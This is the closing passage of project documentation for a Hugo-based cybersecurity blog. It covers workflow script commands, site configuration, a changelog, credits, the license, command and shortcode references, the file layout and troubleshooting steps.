3. **serve**
   - Purpose: Start development server
   - Arguments: None
   - Starts: Hugo server on http://localhost:1313

4. **build**
   - Purpose: Build production site
   - Arguments: None
   - Outputs: public/ directory

5. **watch**
   - Purpose: Monitor for changes and auto-convert
   - Arguments: None
   - Uses: inotifywait (if available) or polling

6. **clean**
   - Purpose: Remove generated content
   - Arguments: None
   - Deletes: content/posts/*, static/images/*

7. **check**
   - Purpose: Verify dependencies
   - Arguments: None
   - Checks: Python, Hugo, Python packages

8. **help**
   - Purpose: Show help message
   - Arguments: None
   - Displays: Command list and examples

#### Exit Codes

**Success (0)**:
- All operations completed successfully
- No errors encountered

**Failure (1)**:
- Missing dependencies
- Build errors
- File errors
- Permission errors

#### Environment Variables

**Checked by script**:
```bash
# Python
command -v python3

# Hugo
command -v hugo

# Python packages
python3 -c "import yaml, frontmatter, PIL"
```

**In config-development.toml**:
```toml
env = "development"
```

### Hugo Configuration API

#### hugo.toml Structure

**Main Sections**:

1. **Base Configuration**:
```toml
baseURL = 'https://yourdomain.com/'    # Site URL
languageCode = 'en-us'                 # Language
title = 'Your Site Title'              # Site title
theme = 'PaperMod'                     # Theme name
```

2. **Minification**:
```toml
[minify]
  disableXML = true     # Don't minify XML
  disableHTML = false   # Minify HTML
  disableCSS = false    # Minify CSS
  disableJS = false     # Minify JavaScript
  disableJSON = true    # Don't minify JSON
  minifyOutput = true   # Enable minification
```

3. **Parameters**:
```toml
[params]
  env = "production"                    # Environment
  defaultTheme = "dark"                 # Default theme
  customCSS = ["css/custom.css"]        # Custom CSS files
  mainSections = ["posts"]              # Main content sections
  showtoc = true                        # Show table of contents
  showReadingTime = true                # Show reading time
  showWordCount = true                  # Show word count
  description = "Site description"      # Meta description
  author = "Author Name"                # Author
```

4. **Assets**:
```toml
[params.assets]
  googleFonts = ["JetBrains Mono:400,500,600", "Inter:400,500,600,700"]
```

5. **Home Info**:
```toml
[params.homeInfoParams]
  title = "Home Page Title"
  subtitle = "Subtitle"
  content = "Welcome message..."
```

6. **Label**:
```toml
[params.label]
  text = "Site Name"
  icon = "/favicon.ico"
  iconHeight = 35
```

7. **Taxonomies**:
```toml
[taxonomies]
  tag = "tags"
  category = "categories"
  difficulty = "difficulties"
  platform = "platforms"
  tool = "tools"
```

8. **Edit Post**:
```toml
[params.editPost]
  URL = "https://github.com/user/repo/edit/main/content"
  Text = "Suggest Changes"
  iconText = "✏️"
  iconLeading = false
```

9. **Reading Time**:
```toml
[params.readingTime]
  postMetaPlacement = "bottom"
  postMetaFormat = "left"
```

10. **Menu**:
```toml
[menu]
  [[menu.main]]
    name = "Posts"
    url = "/posts"
    weight = 1
  [[menu.main]]
    name = "About"
    url = "/about"
    weight = 2
```

11. **Markup**:
```toml
[markup]
  [markup.goldmark]
    [markup.goldmark.renderer]
      unsafe = true  # Allow HTML in markdown
```

#### config-development.toml Override

**Purpose**: Override baseURL for local development

**Pattern**: Inherits all settings from hugo.toml except:
```toml
baseURL = 'http://localhost:1313/'  # Override for dev
env = "development"                 # Override for dev
```

**Usage**: Automatically merged when serving:
```bash
hugo server --config hugo.toml,config-development.toml
```

---

## 14. Appendices

### Appendix A: Changelog

#### Version 2.0 (November 2025)

**Major Enhancements:**
- ✅ **UI/UX Overhaul**: Complete redesign with WCAG AAA accessibility
- ✅ **Fluid Typography**: Implemented clamp() for responsive font sizing
- ✅ **Enhanced Components**: Improved badges, callouts, code blocks with animations
- ✅ **Three Breakpoints**: Desktop, tablet, mobile optimization
- ✅ **Micro-interactions**: Page transitions, hover effects, focus states
- ✅ **Visual Polish**: Professional dark cybersecurity theme

**Bug Fixes:**
- ✅ Fixed double-nested directory path issue in converter
- ✅ Fixed localhost URLs in development mode
- ✅ Fixed missing posts in production builds
- ✅ Updated workflow.sh to include --buildFuture flag
- ✅ Fixed YAML generation in Python converter

**New Features:**
- ✅ Obsidian workflow with automated conversion
- ✅ 5 custom taxonomies (categories, tags, difficulties, platforms, tools)
- ✅ Hugo shortcodes for easy content creation
- ✅ JavaScript copy buttons for code blocks
- ✅ Terminal block shortcode with visual styling
- ✅ Auto-extraction of tools, platforms, difficulty
- ✅ Image optimization and processing

**Improvements:**
- Enhanced dark theme with neon green/cyan accents
- Improved accessibility with keyboard navigation
- Better responsive design across all devices
- Optimized performance with minification
- Professional typography with Inter and JetBrains Mono
- Comprehensive documentation (this document!)

**Breaking Changes:**
- None (backward compatible)

#### Version 1.0 (Earlier)

**Initial Release:**
- Basic Hugo setup with PaperMod theme
- Static site generation
- Basic dark theme
- No automation

### Appendix B: Credits

#### Core Technologies
- **Hugo**: Static site generator - https://gohugo.io/
- **PaperMod Theme**: Hugo theme by Aditya Telange - https://github.com/adityatelange/hugo-PaperMod
- **Inter Font**: Designed by Rasmus Andersson - https://rsms.me/inter/
- **JetBrains Mono Font**: Designed by JetBrains - https://www.jetbrains.com/lp/mono/

#### Python Libraries
- **PyYAML**: YAML parsing - https://pyyaml.org/
- **python-frontmatter**: Front matter handling - https://python-frontmatter.readthedocs.io/
- **Pillow**: Image processing - https://pillow.readthedocs.io/

#### Tools Used in Development
- **Visual Studio Code**: Code editor
- **Obsidian**: Note-taking and knowledge management
- **Git**: Version control
- **Python 3.11+**: Scripting and automation

#### Inspiration
- Cybersecurity community
- CTF platforms (HackTheBox, TryHackMe)
- Open source security tools
- Professional security blogs

#### Contributors
- **Author**: Hrithik
- **Documentation**: Generated with Claude Code (Anthropic)

### Appendix C: Resources

#### Official Documentation
- **Hugo Docs**: https://gohugo.io/documentation/
- **PaperMod Theme**: https://github.com/adityatelange/hugo-PaperMod
- **Obsidian**: https://obsidian.md/
- **Markdown Guide**: https://www.markdownguide.org/

#### Hugo Learning Resources
- **Hugo Quick Start**: https://gohugo.io/getting-started/quick-start/
- **Hugo Templates**: https://gohugo.io/templates/
- **Hugo Shortcodes**: https://gohugo.io/content-management/shortcodes/
- **Hugo Taxonomies**: https://gohugo.io/content-management/taxonomies/

#### CSS Resources
- **CSS Custom Properties**: https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties
- **clamp() Function**: https://developer.mozilla.org/en-US/docs/Web/CSS/clamp()
- **Responsive Design**: https://web.dev/responsive-web-design-basics/
- **WCAG Guidelines**: https://www.w3.org/WAI/WCAG21/quickref/

#### Security Learning
- **OWASP**: https://owasp.org/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/

#### Deployment Platforms
- **Netlify**: https://www.netlify.com/
- **Vercel**: https://vercel.com/
- **Cloudflare Pages**: https://pages.cloudflare.com/
- **GitHub Pages**: https://pages.github.com/

#### Community
- **Hugo Forums**: https://discourse.gohugo.io/
- **r/hugos**: Reddit Hugo community
- **Discord**: Hugo Discord server
- **Stack Overflow**: Hugo tag

### Appendix D: License

#### Project License

This project is open source and available under the [MIT License](LICENSE).

```
MIT License

Copyright (c) 2025 Hri7hik H4cks

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

#### Third-Party Licenses

**PaperMod Theme**: MIT License
- https://github.com/adityatelange/hugo-PaperMod/blob/master/LICENSE

**Fonts**:
- **Inter**: Open Font License - https://scripts.sil.org/OFL
- **JetBrains Mono**: Apache License 2.0 - https://www.jetbrains.com/lp/mono/

**Python Libraries**:
- **PyYAML**: MIT License
- **python-frontmatter**: MIT License
- **Pillow**: PIL Software License

### Appendix E: Command Reference

#### Hugo Commands

**Development:**
```bash
# Start local server
hugo server

# Server with drafts
hugo server -D

# Server with specific port
hugo server --port 8080

# Server with specific host
hugo server --bind 0.0.0.0

# Server without fast render
hugo server --disableFastRender

# Combined options
hugo server -D --port 8080 --bind 0.0.0.0 --disableFastRender
```

**Building:**
```bash
# Build production site
hugo

# Build with minification
hugo --minify

# Build including drafts
hugo --buildDrafts

# Build including expired
hugo --buildExpired

# Build including future posts
hugo --buildFuture

# All options
hugo --minify --buildDrafts --buildExpired --buildFuture

# Quiet mode
hugo --quiet

# Verbose mode
hugo --verbose
```

**Analysis:**
```bash
# List all pages
hugo list all

# List drafts
hugo list drafts

# List future posts
hugo list future

# List expired posts
hugo list expired

# Print stats
hugo --printStats

# Template metrics
hugo --templateMetrics

# Check configuration
hugo --config hugo.toml --printStats
```

#### Workflow Script Commands

```bash
# Setup
./scripts/workflow.sh setup

# Convert
./scripts/workflow.sh convert

# Serve
./scripts/workflow.sh serve

# Build
./scripts/workflow.sh build

# Watch
./scripts/workflow.sh watch

# Clean
./scripts/workflow.sh clean

# Check
./scripts/workflow.sh check

# Help
./scripts/workflow.sh help

# Or show all
./scripts/workflow.sh
```

#### Python Converter Commands

```bash
# Basic conversion
python3 scripts/obsidian_to_hugo_converter.py

# Custom paths
python3 scripts/obsidian_to_hugo_converter.py \
  --source ./obsidian-vault \
  --output ./content/posts

# Custom config
python3 scripts/obsidian_to_hugo_converter.py \
  --config ./custom-config.yaml

# Verbose output
python3 scripts/obsidian_to_hugo_converter.py --verbose

# Help
python3 scripts/obsidian_to_hugo_converter.py --help
```

#### Git Commands

```bash
# Initialize repository
git init

# Clone repository
git clone <url>

# Add all files
git add .

# Commit changes
git commit -m "Message"

# Push to remote
git push origin main

# Pull from remote
git pull origin main

# Create branch
git checkout -b feature/new-post

# Switch branch
git checkout main

# Merge branch
git merge feature/new-post

# Status
git status

# Log
git log --oneline

# Diff
git diff
```

#### File Operations

```bash
# Create new post (Hugo)
hugo new posts/my-post.md

# Create with archetype
hugo new posts/my-post.md --kind ctf-walkthrough

# Copy template
cp obsidian-templates/ctf-walkthrough.md obsidian-vault/posts/my-post.md

# Remove file
rm file.md

# Move file
mv old-name.md new-name.md

# List files
ls -lah

# Find files
find . -name "*.md"

# Search in files
grep -r "text" .

# Count lines
wc -l file.md

# View file
cat file.md

# Edit file
vim file.md
```

### Appendix F: File Structure Reference

```
/home/hrithik/gemini/Hri7hik_H4cks/
├── archetypes/                      # Hugo post templates
│   ├── default.md                   # Default template
│   ├── ctf-walkthrough.md           # CTF walkthrough template
│   └── tutorial.md                  # Tutorial template
├── assets/                          # Static assets (processed by Hugo)
│   ├── css/
│   │   └── custom.css               # Custom styling (725 lines)
│   └── js/
│       └── copy-buttons.js          # Copy button functionality
├── config-development.toml          # Development override config
├── config.toml                      # Legacy config (if exists)
├── content/                         # Hugo content
│   ├── _index.md                    # Homepage content
│   ├── about.md                     # About page
│   └── posts/                       # Blog posts
│       ├── post1.md
│       ├── post2.md
│       └── ...
├── hugo.toml                        # Main Hugo configuration
├── layouts/                         # Custom layouts
│   ├── _default/                    # Default layouts
│   └── shortcodes/                  # Hugo shortcodes
│       ├── callout.html             # Callout box shortcode
│       ├── code.html                # Code block shortcode
│       ├── difficulty.html          # Difficulty badge shortcode
│       ├── image.html               # Image shortcode
│       ├── terminal.html            # Terminal block shortcode
│       └── tool.html                # Tool badge shortcode
├── obsidian-templates/              # Obsidian templates
│   ├── ctf-walkthrough.md           # CTF template for Obsidian
│   ├── security-analysis.md         # Analysis template
│   ├── tutorial.md                  # Tutorial template
│   └── quick-reference.md           # Reference template
├── obsidian-vault/                  # Obsidian source files
│   ├── posts/                       # Write Obsidian notes here
│   └── attachments/                 # Images for Obsidian notes
├── public/                          # Generated site (output)
│   ├── index.html                   # Homepage
│   ├── about/                       # About page
│   ├── posts/                       # Blog posts
│   ├── categories/                  # Category pages
│   ├── tags/                        # Tag pages
│   ├── difficulties/                # Difficulty pages
│   ├── platforms/                   # Platform pages
│   ├── tools/                       # Tool pages
│   ├── images/                      # Optimized images
│   ├── css/                         # Generated CSS
│   ├── js/                          # Generated JavaScript
│   ├── sitemap.xml                  # Sitemap
│   ├── index.xml                    # RSS feed
│   └── 404.html                     # 404 page
├── scripts/                         # Automation scripts
│   ├── workflow.sh                  # Main workflow script
│   ├── obsidian_to_hugo_converter.py # Python converter (400+ lines)
│   └── config.yaml                  # Converter configuration
├── static/                          # Static files (copied as-is)
│   ├── favicon.ico                  # Site icon
│   └── images/                      # Images (non-optimized)
├── themes/                          # Hugo themes
│   └── PaperMod/                    # PaperMod theme (git submodule)
├── .git/                            # Git repository
├── .gitignore                       # Git ignore rules
├── .gitmodules                      # Git submodules config
├── requirements.txt                 # Python dependencies
├── PROJECT_DOCUMENTATION.md         # This documentation file
├── UI_UX_IMPROVEMENTS_SUMMARY.md    # UI/UX enhancement docs
├── BEFORE_AFTER_COMPARISON.md       # Code comparison docs
├── SHORTCODE_EXAMPLES.md            # Shortcode usage examples
├── TROUBLESHOOTING_SUMMARY.md       # Troubleshooting guide
├── LOCALHOST_DEVELOPMENT_FIX.md     # Development fix docs
└── NEW_BLOG_CREATION_GUIDE.md       # Blog setup guide
```

### Appendix G: Quick Reference Cards

#### Obsidian to Hugo Quick Start

```bash
# 1. Setup (first time)
./scripts/workflow.sh setup

# 2. Create post
cp obsidian-templates/ctf-walkthrough.md obsidian-vault/posts/my-ctf.md

# 3. Edit in Obsidian
# (Make changes)

# 4. Convert
./scripts/workflow.sh convert

# 5. Preview
./scripts/workflow.sh serve

# 6. Build
./scripts/workflow.sh build
```

#### Shortcode Cheat Sheet

```markdown
Tools:
{{< tool tool="nmap" />}}

Difficulty:
{{< difficulty level="beginner" />}}

Callout:
{{< callout type="warning" title="Warning" >}}Be careful!{{< /callout >}}

Terminal:
{{< terminal command="nmap -sC -sV 10.10.10.10" >}}Output...{{< /terminal >}}

Code:
{{< code language="bash" title="Script" >}}Commands...{{< /code >}}

Image:
{{< image src="/images/pic.jpg" caption="Description" >}}
```

#### Front Matter Template

```yaml
---
title: "Post Title"
date: 2025-11-02T10:30:00Z
draft: false
categories: ["CTF", "Walkthrough"]
tags: ["nmap", "enumeration"]
difficulties: ["beginner"]
platforms: ["HackTheBox"]
tools: ["nmap", "burp suite"]
description: "Brief description for SEO"
---
```

#### Common Workflows

**Daily Writing:**
```bash
./scripts/workflow.sh watch
# Write in Obsidian
# Auto-converts
# Preview at localhost:1313
```

**Publishing:**
```bash
# 1. Edit post
vim content/posts/my-post.md

# 2. Set draft: false
# (In front matter)

# 3. Build
./scripts/workflow.sh build

# 4. Deploy
# (Deploy public/ directory)
```

**Troubleshooting:**
```bash
# Check posts
hugo list all | grep "post-name"

# Check build
hugo --buildDrafts --buildFuture

# Check dependencies
./scripts/workflow.sh check

# Check converter
python3 scripts/obsidian_to_hugo_converter.py --verbose
```

### Appendix H: Troubleshooting Quick Guide

**Posts not appearing?**
```bash
1. Check date: grep "^date:" content/posts/post.md
2. Check draft: grep "^draft:" content/posts/post.md
3. Check location: ls -lah content/posts/*.md
4. Rebuild: hugo --buildDrafts --buildFuture
```

**Images not loading?**
```bash
1. Check path: grep "!\[.*\](" content/posts/post.md
2. Copy images: cp obsidian-vault/attachments/* static/images/
3. Convert: ./scripts/workflow.sh convert
4. Rebuild: hugo --minify
```

**Build errors?**
```bash
1. Check YAML: yamllint content/posts/post.md
2. Check Hugo: hugo --verbose
3. Restart server: Ctrl+C, hugo server -D
4. Check config: cat hugo.toml
```

**localhost URLs in production?**
```bash
# Check baseURL
grep "baseURL" hugo.toml
# Should be: baseURL = 'https://yourdomain.com/'

# Use dev config for local
hugo server --config hugo.toml,config-development.toml
```

**Conversion fails?**
```bash
1. Check Python: python3 --version
2. Check packages: pip3 list | grep -E "pyyaml|frontmatter|Pillow"
3. Check config: python3 -c "import yaml; yaml.safe_load(open('scripts/config.yaml'))"
4. Verbose mode: python3 scripts/obsidian_to_hugo_converter.py --verbose
```

---

## Conclusion

This comprehensive documentation covers all aspects of the Hri7hik H4cks Hugo cybersecurity blog project. Whether you're a beginner setting up your first blog or an experienced user looking to customize and extend the functionality, this guide provides the information you need.

### Key Takeaways

1. **Dual Workflows**: Choose between Direct Hugo or Obsidian workflow based on your needs
2. **Automated Conversion**: The Python converter handles syntax conversion, image processing, and front matter generation
3. **Rich Components**: Use shortcodes for difficulty badges, callouts, terminals, code blocks, and more
4. **Customizable**: Easy to modify colors, fonts, layouts, and add new features
5. **Production Ready**: Built for deployment with Netlify, Vercel, GitHub Pages, or any static host

### Next Steps

- **Set up your environment** using the Getting Started guide
- **Create your first post** using the templates
- **Customize the theme** to match your brand
- **Deploy to production** using your preferred hosting platform
- **Join the community** and share your knowledge

### Support

For additional help:
- Review the troubleshooting section
- Check the Hugo documentation
- Join the Hugo community forums
- Explore the PaperMod theme documentation

### Contributing

Contributions welcome! If you find bugs or have suggestions for improvements:
1. Check existing issues
2. Create a new issue with detailed description
3. Submit pull requests for fixes
4. Help improve documentation

---

**End of Documentation**

*This documentation is part of the Hri7hik H4cks project and is maintained alongside the codebase. Last updated: November 2025*